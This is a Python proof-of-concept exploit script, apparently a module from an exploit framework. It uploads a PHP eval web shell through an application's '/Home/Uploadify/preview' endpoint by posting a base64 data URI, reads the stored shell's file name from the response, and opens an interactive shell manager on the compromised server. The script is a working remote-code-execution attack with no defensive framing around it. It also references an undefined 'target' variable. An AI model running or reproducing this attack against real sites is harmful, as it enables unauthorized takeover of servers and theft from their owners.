import requests
import base64
import json
import re
from plugin.component.shell import shell
from plugin.component.check import url_check


def poc(url):
    try:
        url_check(url,"index.php")

        url1 = url + "/Home/Uploadify/preview"
        shell_password = raw_input("[*] Please enter the shell-password:")
        shell_content = "<?php eval($_POST['%s']);?>" % shell_password
        post_data = "data:image/php;base64,%s" % base64.b64encode(
            shell_content)
        r = requests.post(url1, data=post_data)

        header = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
            'Accept':
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':
            'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding':
            'gzip, deflate',
        }

        p = re.compile("(?<=preview\/)(.*)(php)")
        shell_name = re.search(p, json.loads(r.text)['result']).group(0)
        shell_path = target.url.replace("index.php", "preview/") + shell_name
        shell_manage = shell(header, shell_path, shell_password)
        shell_manage.check()
        shell_manage.post_manage()
    except Exception:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
        pass
